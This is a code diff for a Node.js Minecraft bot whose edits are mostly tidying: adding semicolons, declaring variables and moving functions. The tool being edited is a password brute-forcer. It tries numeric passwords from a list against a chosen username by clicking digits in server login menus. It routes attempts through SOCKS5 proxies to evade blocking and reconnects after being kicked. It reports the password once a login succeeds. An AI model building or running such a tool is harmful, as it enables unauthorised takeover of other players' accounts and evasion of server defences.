@@ -17,13 +17,23 @@ const passwordFile = process.argv[6];
 const spaces = process.argv[7];
 const proxyFile = process.argv[8];
 
-if (passwordFile === null) {
+function getSpaces(spaces) {
+    return ' '.repeat(parseInt(spaces) || 0);
+}
+
+function containsOnlyNumbers(str) {
+    return /^\d+$/.test(str);
+}
+
+let passwords = utils.getListOfPasswords(passwordFile);
+
+if (passwords === null) {
     utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered password file is not valid.`);
     process.exit(1);
 }
 
 if (proxyFile) {
-    proxyTest = utils.getListOfPasswords(proxyFile)
+    let proxyTest = utils.getListOfPasswords(proxyFile);
 
     if (proxyTest === null) {
         utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered proxy file (§c${proxyFile}§f) is not valid.`);
@@ -31,16 +41,7 @@ if (proxyFile) {
     }
 }
 
-function containsOnlyNumbers(str) {
-  return /^\d+$/.test(str);
-}
-
-function getSpaces(spaces) {
-    return ' '.repeat(spaces);
-}
-
-let passwords = utils.getListOfPasswords(passwordFile)
-passwords = passwords.filter(containsOnlyNumbers)
+passwords = passwords.filter(containsOnlyNumbers);
 
 if (passwords.length === 0) {
     utils.coloredText(`\n${getSpaces(spaces)}§f[§c#§f] §fThe entered password file does not contain numeric passwords.`);
@@ -75,14 +76,14 @@ function createBot(proxy=null) {
                         }
                     }, (err, info) => {
                         if (err) {
-                            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §cThe proxy server the bot connected to did not respond. Trying to connect with another proxy..`))
+                            utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §cThe proxy server the bot connected to did not respond. Trying to connect with another proxy..`));
                             sendBot();
                             return;
                         }
 
-                        client.setSocket(info.socket)
-                        client.emit('connect')
-                    })
+                        client.setSocket(info.socket);
+                        client.emit('connect');
+                    });
                 },
 
                 agent: new ProxyAgent({ protocol: 'socks5:', host: proxy[0], port: proxy[1] }),
@@ -90,7 +91,7 @@ function createBot(proxy=null) {
                 fakeHost: host,
                 version: version,
                 hideErrors: true,
-            })
+            });
         } else {
             bot = mineflayer.createBot({
                 host: host,
@@ -99,48 +100,48 @@ function createBot(proxy=null) {
                 username: username,
                 version: version,
                 hideErrors: true
-            })
+            });
         }
     } catch (error) {
         if (error.message.includes('is not supported')) {
             const version = error.message.match(/\d+\.\d+\.\d+/)[0];
-            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Version §c§l${version} §cis not currently supported.`)
+            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Version §c§l${version} §cis not currently supported.`);
         }
 
         else if (error.message.includes('unsupported protocol version:')) {
+            let protocol;
             try {
-                protocol = error.message.match(/\d+/)['input'].split(': ')[1]
-                
+                protocol = error.message.match(/\d+/)['input'].split(': ')[1];
             } catch {
                 protocol = error.message.match(/\d+/);
             }
             
             if (protocol != null) {
-                utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Protocol §c§l${protocol} §cis not supported`)
+                utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Protocol §c§l${protocol} §cis not supported`);
             } else {
-                utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Protocol is not supported`)
+                utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §cIncompatible Minecraft version: Protocol is not supported`);
             }
         }
 
         else {
-            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §4Error`)
+            utils.coloredText(`\n${getSpaces(spaces)}§f§l[§c§l#§f§l] §4Error`);
         }
 
         process.exit(1);
     }
 
-    bot.setMaxListeners(Infinity)
+    bot.setMaxListeners(Infinity);
 
     bot.on('login', () => {
         utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §aThe bot has connected to the server.`));
-    })
+    });
 
     bot.on('title', (text) => {
         for (const word of wordsOnLogin) {
             if (text.includes(word)) {
                 utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fThe password of the §a${username} §fuser is: §a${passwords[attempts]}`));
                 bot.quit();
-                process.exit(1)
+                process.exit(1);
             }
         }
 
@@ -152,23 +153,23 @@ function createBot(proxy=null) {
 
         utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fTesting the password: §a${passwords[attempts]}`));
         attempts += 1;
-    })
+    });
 
     bot.on('windowOpen', (window) => {
         const windowItems = window.containerItems();
-        let numbersLength = 0
+        let numbersLength = 0;
 
         for (const number of passwords[attempts]) {
             windowItems.forEach((item) => {
                 let {customName, slot} = item;
 
                 if (customName.includes(number)) {
-                    bot.clickWindow(slot, 1, 0).then(r => {})
+                    bot.clickWindow(slot, 1, 0).then(r => {});
                     numbersLength += 1;
                 }
-            })
+            });
         }
-    })
+    });
 
     bot.on('kicked', (reason) => {
         const message = utils.getTextFromJSON(reason);
@@ -184,7 +185,7 @@ function createBot(proxy=null) {
         setTimeout(() => {
             sendBot();
         }, reconnectDelay);
-    })
+    });
 
     bot.on('error', (_) => {
         utils.coloredText((`\n${getSpaces(spaces)}§f[§c#§f] §fThe bot was kicked from the server for the following reason: §cThe bot was forced to disconnect.`));
@@ -192,7 +193,7 @@ function createBot(proxy=null) {
         setTimeout(() => {
             sendBot();
         }, reconnectDelay);
-    })
+    });
 }
 
 function sendBot() {
@@ -213,4 +214,3 @@ function sendBot() {
 }
 
 sendBot();
-
